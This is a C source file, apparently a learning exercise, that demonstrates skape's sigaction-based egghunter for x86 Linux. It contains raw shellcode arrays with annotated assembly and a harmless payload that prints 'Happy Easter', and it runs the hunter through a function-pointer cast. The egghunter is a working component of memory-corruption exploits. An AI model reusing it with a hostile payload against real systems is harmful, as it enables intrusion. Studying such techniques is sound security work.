/*
based on skape's sigaction(2) method
http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

NOTE: MARKER does not need to be legal, executable assembly
      with this method
*/

#include <stdio.h>
#include <string.h>

#define MARKER    "\x93\x51\x93\x59"
/*
     93       xchg   ebx,eax
     51       push   ecx
     93       xchg   ebx,eax
     59       pop    ecx
     As far as assembly goes, this is pretty preposterous.
*/

// this is what the egghunter is looking for; it could be
// anything; this just writes "Happy Easter" to STDOUT
unsigned char shellcode[] =
MARKER  // skape's method requires repeating
MARKER  // the marker twice
"\x31\xdb\xf7\xe3\x6a\x04\x58\xeb\x0a\x59\xb2\x0d\xcd\x80\x6a"
"\x01\x58\xcd\x80\xe8\xf1\xff\xff\xff\x48\x61\x70\x70\x79\x20"
"\x45\x61\x73\x74\x65\x72\x0a";
/*
    global _start
    section .text
    _start:
        xor ebx, ebx
        mul ebx
        push byte 0x4
        pop eax
        jmp short river
    bridge:
        pop ecx
        mov dl, 0xd
        int 0x80
        ; exit
        push 0x1
        pop eax
        int 0x80
    river:
        call bridge
        msg db "Happy Easter",0xa
*/

unsigned char egghunter[] =
"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1"
"\xb8"    MARKER    "\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
/*
    global _start
    section .text
    _start:
    fillOnes:
        or cx, 0xfff
    shiftUp:
        inc ecx
        push byte 0x43         ; sigaction(2)
        pop eax
        int 0x80
        cmp al, 0xf2
        jz fillOnes
        mov eax, 0x59935193    ; marker
        mov edi, ecx
        scasd                  ; advances edi by 0x4 if there is a match;
                               ; assumes direction flag (DF) is not set
        jnz shiftUp
        scasd
        jnz shiftUp
        jmp edi
*/

void main() {
    printf("egghunter length: %d\n", strlen(egghunter));
    printf("shellcode length: %d\n", strlen(shellcode));
    ((int(*)())egghunter)();
}


